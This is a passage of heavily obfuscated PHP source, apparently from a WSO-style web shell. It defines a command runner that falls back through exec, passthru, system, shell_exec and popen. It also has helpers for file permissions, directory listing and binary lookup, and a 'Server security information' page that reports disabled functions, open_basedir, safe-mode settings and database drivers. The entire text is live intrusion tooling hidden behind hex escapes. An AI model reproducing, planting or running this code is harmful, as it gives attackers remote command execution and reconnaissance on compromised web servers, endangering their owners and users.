on\x73"],"\x70o\x73ix\x5fg\x65\x74\x67\x72\x67\x69d")===false)){function posix_getgrgid($p){return false;}}function ex($in){${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x6a\x69s\x6b\x69\x66\x78nm\x61\x6c\x64"]}="";$atzsxhdkt="i\x6e";$arrcwtnplihu="o\x75\x74";if(function_exists("ex\x65\x63")){$hsjtnzdlxq="\x6f\x75t";${"\x47LOB\x41L\x53"}["\x6a\x6a\x72\x76\x74\x69\x72yi\x73\x75"]="ou\x74";@exec(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x65\x68\x75on\x72\x64\x77\x76\x79\x74\x62"]},${$hsjtnzdlxq});${${"\x47L\x4f\x42\x41L\x53"}["\x6ai\x73ki\x66\x78n\x6d\x61\x6c\x64"]}=@join("\n",${${"\x47\x4cO\x42\x41LS"}["\x6a\x6a\x72v\x74\x69\x72yis\x75"]});}elseif(function_exists("pa\x73\x73thru")){$nxydvm="i\x6e";ob_start();@passthru(${$nxydvm});${${"\x47\x4c\x4fBA\x4cS"}["\x6a\x69s\x6bif\x78n\x6d\x61\x6cd"]}=ob_get_clean();}elseif(function_exists("\x73\x79s\x74\x65m")){ob_start();${"G\x4c\x4f\x42\x41\x4cS"}["\x74\x6dw\x65\x69\x63\x68\x71"]="\x69\x6e";@system(${${"\x47\x4c\x4fBA\x4cS"}["t\x6d\x77e\x69\x63\x68q"]});${${"\x47\x4c\x4f\x42\x41LS"}["\x6ai\x73\x6bifx\x6ema\x6c\x64"]}=ob_get_clean();}elseif(function_exists("sh\x65\x6c\x6c\x5fexec")){$gqkkgkm="\x69n";$tdnvphkvwxx="\x6f\x75\x74";${$tdnvphkvwxx}=shell_exec(${$gqkkgkm});}elseif(is_resource(${${"\x47L\x4fB\x41\x4c\x53"}["v\x63s\x77\x78\x74\x73\x72\x6e"]}=@popen(${$atzsxhdkt},"r"))){$eibrlthh="\x66";$ljnvmst="f";$kxzovgkt="\x6f\x75\x74";$biodczalkxvx="o\x75t";$buxpch="\x66";${$kxzovgkt}="";while(!@feof(${$eibrlthh}))${$biodczalkxvx}.=fread(${$ljnvmst},1024);pclose(${$buxpch});}return${$arrcwtnplihu};}function viewSize($s){${"GLO\x42\x41\x4c\x53"}["\x65\x76\x62bq\x77\x73o\x66"]="\x73";${"\x47\x4c\x4fBA\x4cS"}["ufh\x76\x6a\x62\x65\x71"]="\x73";${"\x47LO\x42\x41L\x53"}["\x79\x62n\x79\x77\x6bh\x7a\x70"]="\x73";if(${${"\x47\x4c\x4fB\x41\x4cS"}["\x70\x67\x75i\x6d\x76\x71a\x6e"]}>=1073741824)return sprintf("%\x31\x2e2\x66",${${"GLO\x42A\x4c\x53"}["pg\x75\x69\x6dv\x71\x61n"]}/1073741824)." \x47B";elseif(${${"\x47\x4cO\x42\x41L\x53"}["\x75\x66hvjb\x65q"]}>=1048576)return sprintf("\x251\x2e\x32f",${${"\x47LO\x42\x41LS"}["\x79\x62ny\x77\x6b\x68\x7a\x70"]}/1048576)." \x4d\x42";elseif(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x65vb\x62\x71\x77\x73o\x66"]}>=1024)return sprintf("%1.2f",${${"GLO\x42\x41\x4cS"}["\x70\x67\x75\x69\x6d\x76q\x61\x6e"]}/1024)."\x20\x4b\x42";else return${${"\x47\x4c\x4fBAL\x53"}["\x70gu\x69\x6d\x76q\x61\x6e"]}." B";}function perms($p){${"\x47\x4c\x4f\x42A\x4cS"}["ok\x6edv\x74\x75\x67\x6em"]="i";${"GLOB\x41L\x53"}["\x6fc\x6b\x77w\x6d\x76\x6fc\x62"]="\x70";${"G\x4c\x4f\x42\x41L\x53"}["\x75\x74hm\x69\x79\x77\x75\x68o"]="\x69";$qwtgqt="\x69";${"G\x4cO\x42\x41\x4c\x53"}["\x72\x66\x69\x74px\x74\x6fe\x73cv"]="\x69";${"G\x4c\x4f\x42\x41LS"}["\x6d\x69c\x6c\x68\x63\x71\x6db\x6f"]="p";$bdvjnvawvej="\x70";$mmuylg="p";${"\x47\x4c\x4f\x42\x41\x4cS"}["q\x70\x72c\x73\x67\x73"]="\x69";${"GL\x4fBA\x4c\x53"}["\x6d\x65\x73\x75\x6f\x73\x68"]="i";$veswjmoexi="i";$hbeuvxm="\x70";${"G\x4c\x4fBA\x4cS"}["\x6d\x75\x63i\x73\x6a\x76h"]="\x70";$fwnfisghf="i";${"\x47L\x4fB\x41\x4c\x53"}["\x65\x74\x6d\x73h\x79\x6b\x70o"]="i";$ewxigvxdozwd="\x70";if((${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6f\x63\x6bw\x77m\x76o\x63\x62"]}&0xC000)==0xC000)${${"\x47\x4c\x4fB\x41L\x53"}["\x71eux\x7a\x6b"]}="\x73";elseif((${${"G\x4c\x4fBALS"}["\x66\x79\x69\x66\x66\x73\x78"]}&0xA000)==0xA000)${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x75\x74hm\x69yw\x75\x68\x6f"]}="\x6c";elseif((${${"\x47LO\x42A\x4c\x53"}["\x66yif\x66sx"]}&0x8000)==0x8000)${$qwtgqt}="-";elseif((${${"G\x4cO\x42AL\x53"}["\x66\x79\x69\x66\x66s\x78"]}&0x6000)==0x6000)${${"\x47\x4c\x4f\x42AL\x53"}["\x6f\x6b\x6e\x64\x76\x74\x75\x67\x6e\x6d"]}="b";elseif((${$mmuylg}&0x4000)==0x4000)${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x71\x65u\x78\x7a\x6b"]}="\x64";elseif((${${"G\x4c\x4f\x42A\x4cS"}["\x66\x79\x69\x66\x66\x73x"]}&0x2000)==0x2000)${${"GL\x4f\x42\x41\x4cS"}["rf\x69\x74p\x78t\x6f\x65s\x63v"]}="c";elseif((${${"\x47LOB\x41\x4c\x53"}["\x6di\x63\x6ch\x63qm\x62o"]}&0x1000)==0x1000)${${"\x47\x4c\x4f\x42\x41L\x53"}["\x71e\x75xzk"]}="\x70";else${${"\x47\x4c\x4f\x42\x41L\x53"}["m\x65s\x75\x6fsh"]}="\x75";${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x71\x65\x75x\x7a\x6b"]}.=((${${"\x47\x4cOBALS"}["\x6d\x75\x63\x69\x73\x6av\x68"]}&0x0100)?"\x72":"-");${$fwnfisghf}.=((${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x66y\x69f\x66\x73\x78"]}&0x0080)?"\x77":"-");$jqfnkti="\x69";${${"\x47\x4cO\x42\x41L\x53"}["\x65\x74\x6d\x73\x68ykp\x6f"]}.=((${${"G\x4c\x4f\x42\x41L\x53"}["fy\x69ff\x73x"]}&0x0040)?((${${"\x47\x4c\x4f\x42AL\x53"}["\x66\x79\x69\x66\x66\x73x"]}&0x0800)?"\x73":"\x78"):((${${"\x47L\x4fBA\x4c\x53"}["\x66yif\x66s\x78"]}&0x0800)?"\x53":"-"));${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x71pr\x63\x73gs"]}.=((${$ewxigvxdozwd}&0x0020)?"\x72":"-");${"\x47LO\x42A\x4cS"}["\x62\x66tu\x69i\x69"]="p";${${"GL\x4fBA\x4c\x53"}["\x71\x65\x75\x78z\x6b"]}.=((${${"\x47\x4c\x4fBAL\x53"}["\x66\x79i\x66\x66\x73\x78"]}&0x0010)?"\x77":"-");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x71\x65\x75\x78z\x6b"]}.=((${${"GLOB\x41\x4c\x53"}["\x66\x79i\x66f\x73\x78"]}&0x0008)?((${$hbeuvxm}&0x0400)?"\x73":"\x78"):((${$bdvjnvawvej}&0x0400)?"\x53":"-"));$aipqqhdzu="\x70";${$jqfnkti}.=((${${"\x47\x4cO\x42AL\x53"}["f\x79\x69\x66\x66s\x78"]}&0x0004)?"\x72":"-");${${"G\x4cOBA\x4c\x53"}["\x71\x65u\x78z\x6b"]}.=((${${"\x47\x4cOB\x41LS"}["\x62\x66t\x75\x69\x69\x69"]}&0x0002)?"w":"-");${${"\x47\x4c\x4fBA\x4c\x53"}["q\x65\x75\x78\x7ak"]}.=((${${"\x47\x4c\x4f\x42A\x4c\x53"}["f\x79i\x66fs\x78"]}&0x0001)?((${${"\x47\x4cOB\x41\x4cS"}["fy\x69\x66\x66sx"]}&0x0200)?"\x74":"\x78"):((${$aipqqhdzu}&0x0200)?"\x54":"-"));return${$veswjmoexi};}function viewPermsColor($f){$iqdfjzulhsxp="\x66";${"\x47LO\x42A\x4cS"}["n\x77\x61\x6c\x6a\x67"]="\x66";if(!@is_readable(${$iqdfjzulhsxp}))return"<\x66\x6fn\x74 \x63ol\x6fr=#FF\x30000\x3e\x3cb>".perms(@fileperms(${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x76c\x73w\x78\x74\x73\x72n"]}))."\x3c/b>\x3c/\x66ont\x3e";elseif(!@is_writable(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x76\x63\x73\x77x\x74\x73\x72\x6e"]}))return"<f\x6fn\x74 \x63olo\x72\x3d\x77\x68\x69t\x65\x3e\x3cb>".perms(@fileperms(${${"\x47\x4cO\x42\x41\x4c\x53"}["\x6ew\x61\x6c\x6a\x67"]}))."\x3c/b></fo\x6et>";else return"<fon\x74 \x63o\x6cor=#\x300A8\x41\x38\x3e<\x62>".perms(@fileperms(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x76\x63\x73\x77\x78t\x73\x72\x6e"]}))."</\x62>\x3c/fo\x6e\x74\x3e";}if(!function_exists("\x73\x63a\x6ed\x69\x72")){function scandir($dir){$clatpz="\x66\x69les";${"G\x4c\x4fB\x41\x4cS"}["\x69\x79cq\x71\x7a\x77\x75\x63\x71\x72"]="\x64\x68";$ntwrvco="d\x68";$gzlhqxbyvn="\x66\x69\x6c\x65\x6e\x61\x6de";${${"\x47\x4c\x4fB\x41\x4cS"}["\x69y\x63\x71qzw\x75cq\x72"]}=opendir(${${"G\x4c\x4f\x42A\x4c\x53"}["\x76t\x6b\x72\x67qoy\x6a\x71\x64s"]});while(false!==(${$gzlhqxbyvn}=readdir(${$ntwrvco}))){${"\x47\x4c\x4fBA\x4cS"}["\x67\x62\x77m\x62m\x64\x70"]="\x66\x69\x6c\x65\x6e\x61\x6d\x65";$vbegnv="\x66\x69\x6c\x65\x73";${$vbegnv}[]=${${"\x47\x4cOB\x41\x4c\x53"}["g\x62\x77\x6db\x6ddp"]};}return${$clatpz};}}function which($p){${"G\x4c\x4f\x42ALS"}["b\x7a\x65\x68\x6a\x61\x69g\x76cg"]="\x70\x61\x74\x68";${"\x47L\x4f\x42\x41\x4cS"}["\x65fjudk\x6ak"]="\x70";${${"\x47\x4c\x4f\x42\x41L\x53"}["hdx\x77g\x68"]}=ex("w\x68ic\x68 ".${${"\x47\x4cO\x42\x41LS"}["\x65\x66j\x75d\x6bj\x6b"]});if(!empty(${${"G\x4c\x4fBA\x4c\x53"}["\x68\x64x\x77\x67\x68"]}))return${${"G\x4c\x4f\x42AL\x53"}["bz\x65h\x6a\x61i\x67\x76\x63g"]};return false;}function actionSecInfo(){${"\x47\x4c\x4f\x42\x41LS"}["\x74x\x63gs\x74mg"]="t\x65\x6d\x70";$kvrkghoouzaa="\x74e\x6dp";$ttygplcjfmfb="\x74\x65\x6dp";printHeader();echo"<\x68\x31\x3e\x53e\x72\x76\x65\x72 secu\x72\x69\x74y\x20\x69\x6e\x66orm\x61ti\x6fn</\x68\x31><\x64\x69\x76 cl\x61\x73s=c\x6f\x6e\x74\x65\x6e\x74\x3e";function showSecParam($n,$v){${${"G\x4c\x4fB\x41\x4c\x53"}["\x74\x68sd\x7a\x70f"]}=trim(${${"\x47\x4c\x4f\x42AL\x53"}["\x74\x68\x73\x64\x7ap\x66"]});if(${${"GL\x4fB\x41\x4cS"}["thsdz\x70\x66"]}){${"\x47\x4c\x4f\x42A\x4c\x53"}["\x68y\x65\x63\x66\x62a\x75\x61"]="\x76";${"GL\x4f\x42\x41\x4c\x53"}["sy\x65\x74u\x69p"]="\x76";${"\x47\x4c\x4f\x42\x41LS"}["\x70i\x67\x70i\x6e\x62\x63"]="\x6e";$dowlaauldxm="\x76";echo"\x3cs\x70\x61\x6e\x3e".${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x70i\x67pi\x6eb\x63"]}.": \x3c/s\x70\x61\x6e>";if(strpos(${${"G\x4cO\x42\x41LS"}["sy\x65\x74\x75\x69\x70"]},"\n")===false)echo${$dowlaauldxm}."<b\x72\x3e";else echo"\x3c\x70r\x65 \x63\x6c\x61\x73\x73\x3dml1>".${${"\x47\x4c\x4fBA\x4c\x53"}["\x68\x79\x65c\x66\x62\x61\x75a"]}."</\x70\x72e>";}}${"GL\x4fB\x41\x4c\x53"}["\x76g\x78\x64\x67\x6e\x65c\x6d\x79\x75"]="\x74e\x6dp";showSecParam("\x53\x65\x72\x76\x65\x72\x20s\x6fftw\x61\x72\x65",@getenv("S\x45\x52\x56\x45R\x5fSO\x46\x54W\x41R\x45"));showSecParam("D\x69\x73\x61\x62\x6ced\x20\x50H\x50 \x46\x75\x6e\x63\x74\x69\x6f\x6es",($GLOBALS["d\x69s\x61b\x6ce\x5f\x66u\x6e\x63\x74\x69\x6f\x6e\x73"])?$GLOBALS["\x64i\x73\x61b\x6ce_\x66\x75\x6ectio\x6es"]:"\x6e\x6fn\x65");showSecParam("\x4fpe\x6e\x20\x62a\x73e\x20dir",@ini_get("\x6fpen\x5fb\x61se\x64\x69\x72"));showSecParam("S\x61f\x65\x20\x6d\x6f\x64e\x20\x65xec\x20\x64ir",@ini_get("sa\x66e\x5f\x6d\x6fde\x5fe\x78\x65\x63_di\x72"));showSecParam("Sa\x66\x65 mod\x65\x20i\x6ecl\x75\x64e \x64ir",@ini_get("sa\x66e_\x6d\x6f\x64e_in\x63\x6c\x75\x64\x65\x5fdir"));showSecParam("c\x55\x52\x4c \x73u\x70\x70\x6fr\x74",function_exists("cur\x6c\x5f\x76e\x72\x73i\x6fn")?"e\x6e\x61\x62le\x64":"\x6e\x6f");${${"\x47L\x4fB\x41\x4cS"}["\x68\x72\x74\x77y\x6a\x64\x66\x6c\x63"]}=array();if(function_exists("my\x73q\x6c\x5fget_\x63\x6c\x69\x65\x6et\x5f\x69\x6e\x66o"))${${"GLO\x42\x41\x4c\x53"}["h\x72\x74\x77\x79\x6a\x64\x66\x6cc"]}[]="My\x53\x71\x6c (".mysql_get_client_info().")";if(function_exists("\x6d\x73\x73ql\x5fc\x6fnnec\x74"))${${"G\x4cO\x42\x41L\x53"}["\x76g\x78d\x67n\x65\x63\x6dy\x75"]}[]="M\x53S\x51\x4c";if(function_exists("\x70g\x5f\x63on\x6e\x65ct"))${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x74\x78\x63\x67\x73\x74\x6d\x67"]}[]="\x50o\x73tgr\x65\x53Q\x4c";if(function_exists("oci_co\x6e\x6ee\x63t"))${$ttygplcjfmfb}[]="Ora\x63\x6c\x65";showSecParam("Suppor\x